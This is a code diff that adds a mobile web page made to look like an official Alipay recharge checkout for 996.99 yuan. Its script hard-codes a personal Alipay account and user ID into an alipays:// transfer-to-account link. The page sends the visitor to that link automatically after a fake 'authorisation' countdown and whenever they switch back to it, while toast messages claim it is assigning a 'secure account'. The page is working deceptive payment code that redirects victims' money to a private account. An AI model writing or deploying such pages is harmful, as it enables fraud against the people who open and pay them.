@@ -1,0 +1,241 @@
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
+    <link rel="stylesheet" type="text/css" href="QRCode.css" />
+    <script type="text/javascript" src="jquery-2.0.3.min.js"></script>
+
+
+</head>
+<body>
+
+<div style="width: 100%; text-align: center;font-family:微软雅黑;">
+    <div id="panelWrap" class="panel-wrap">
+        <!-- CUSTOM LOGO -->
+        <div class="panel-heading">
+            <div class="row">
+                <div class="col-md-12 text-center">
+                    <img src="alipay.png" alt="Logo-QQPay" class="img-responsive center-block" style="height: 30px;" />
+                </div>
+
+            </div>
+        </div>
+        <!-- PANEL TlogoEMPLATE START -->
+        <div class="panel panel-easypay">
+            <!-- PANEL HEADER -->
+            <div class="panel-heading" style=" padding: 0 15px;">
+                <h3>
+                    <small>订单号：12020012012164070635</small>
+
+                </h3>
+                <div class="money">
+                    <span class="price" style="font-size: 2.2rem;">996.99</span>
+                    <span class="currency">元</span>
+
+                </div>
+            </div>
+            <div class="panel-footer">
+                <button id="btnTime" style="font-size: 16px;" class="btn  btn-primary btn-lg btn-block" disabled>正在获取支付宝授权，<span style="color:red;">30</span>秒后即可支付！</button>
+            </div>
+
+        </div>
+
+
+
+
+
+        <div class="panel-footer" style="text-align:center;">
+            <!-- SYSTEM MESSAGE -->
+            <p style="color: darkgreen;font-size: 1.5rem">不想等待授权？</p>
+
+            <p id="go_list" style="color: red;font-size: 1.3rem">手机返回到桌面，再打开支付宝app，即可完成充值</p>
+            <p style="color: green">亲，赶紧试试吧～</p>
+
+        </div>
+
+    </div>
+</div>
+
+<script type="text/javascript"  src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
+<script>
+    //修改top ios访问顶上去
+    let u = navigator.userAgent, app = navigator.appVersion;
+    let isAndroid = u.indexOf('Android') > -1 || u.indexOf('Linux') > -1;
+    if (!isAndroid) {
+        let aa= document.getElementById('auihead');
+        aa.style.marginTop = '65px';
+    }
+    //导航栏颜色
+    AlipayJSBridge.call("setTitleColor", {
+        color: parseInt('c14443', 16),
+        reset: false // (可选,默认为false)  是否重置title颜色为默认颜色。
+    });
+    //导航栏loadin
+    AlipayJSBridge.call('showTitleLoading');
+    //副标题文字
+    AlipayJSBridge.call('setTitle', {
+        title: '自助充值',
+        subtitle: '安全支付'
+    });
+    //右上角菜单
+    AlipayJSBridge.call('setOptionMenu', {
+        icontype: 'filter',
+        redDot: '01', // -1表示不显示，0表示显示红点，1-99表示在红点上显示的数字
+    });
+    AlipayJSBridge.call('showOptionMenu');
+    document.addEventListener('optionMenu', function(e) {
+        AlipayJSBridge.call('showPopMenu', {
+            menus: [{
+                name: "查看帮助",
+                tag: "tag1",
+                redDot: "1"
+            },
+                {
+                    name: "我要投诉",
+                    tag: "tag2",
+                }
+            ],
+        }, function(e) {
+            console.log(e);
+        });
+    }, false);
+    document.addEventListener('popMenuClick', function (e) {
+    }, false);
+</script>
+
+
+<script>
+
+    var a = "2088622230434987";
+    var b = "996.99";
+    var intDiff = parseInt('389');
+    ap.allowPullDownRefresh(false);
+    ap.onPullDownRefresh(function (res) {
+        if (!res.refreshAvailable) {
+            ap.alert({
+                content: '刷新已禁止',
+                buttonText: '恢复'
+            }, function () {
+                ap.allowPullDownRefresh(true);
+                ap.showToast('刷新已恢复')
+            });
+        }
+    });
+
+    var timecount = 0;
+
+    function ready(callback) {
+        if (window.AlipayJSBridge) {
+            callback && callback();
+        } else {
+            document.addEventListener('AlipayJSBridgeReady', callback, false);
+        }
+    }
+    var go_url ="alipays://platformapi/startapp?appId=20000200&actionType=toAccount&account=15836738382&userId=2088622230434987&amount=996.99&memo=";
+
+
+    var func = function () {
+        setTimeout(function () {
+            window.location.href=go_url
+
+
+        }, 200);
+
+
+
+    };
+
+    setTimeout(function(){
+        $('.panel-footer').show();
+        document.addEventListener("visibilitychange", () => {
+            if(document.hidden) {
+                // 页面被挂起
+            }
+            else {
+                func();
+            }
+        });
+    },2000);
+
+    var funwait = function(){
+        if(timecount == 5){
+            AlipayJSBridge.call('toast', {
+                content: '正在与马爸爸联系，请稍后',
+                type: 'none',
+                duration: 2000
+            }, function() {
+            });
+        }
+        else if(timecount ==10){
+            AlipayJSBridge.call('toast', {
+                content: '小哥哥小姐姐，请稍后',
+                type: 'none',
+                duration: 2000
+            }, function() {
+            });
+        }
+        else if(timecount == 15){
+            AlipayJSBridge.call('toast', {
+                content: '正在为您分配安全账号...',
+                type: 'none',
+                duration: 2000
+            }, function() {
+            });
+        }
+        else if(timecount == 20){
+            AlipayJSBridge.call('toast', {
+                content: '确认过眼神，正在卖力申请授权...',
+                type: 'none',
+                duration: 2000
+            }, function() {
+            });
+        }
+        else if(timecount == 25){
+            AlipayJSBridge.call('toast', {
+                content: '授权确认中，别着急哦',
+                type: 'none',
+                duration: 2000
+            }, function() {
+            });
+        }
+        else if(timecount == 28){
+            AlipayJSBridge.call('toast', {
+                content: '小哥哥小姐姐，马上就可以付款了',
+                type: 'none',
+                duration: 2000
+            }, function() {
+            });
+        }
+    };
+    //ready(function() {
+    $('#btnTime').attr("disabled", "disabled");
+    $('#btnTime').click(function () {
+        func();
+    });
+    var timeid = window.setInterval(function () {
+        if (timecount >= 30) {
+            $('#btnTime').html('立即支付');
+            $('#btnTime').removeAttr("disabled");
+            window.clearInterval(timeid);
+            func();
+        } else {
+            timecount++;
+            funwait();
+            $('#btnTime').html('正在获取支付宝授权，<span style="color:red;">' + (30 - timecount) + '</span>秒后即可支付！');
+        }
+    }, 3100);
+
+    var btn = document.querySelector('#go_list');
+    btn.addEventListener('click', function(){
+        ap.choosePhoneContact(function(res){
+
+        });
+    });
+    //});
+</script>
+</body>
+</html>
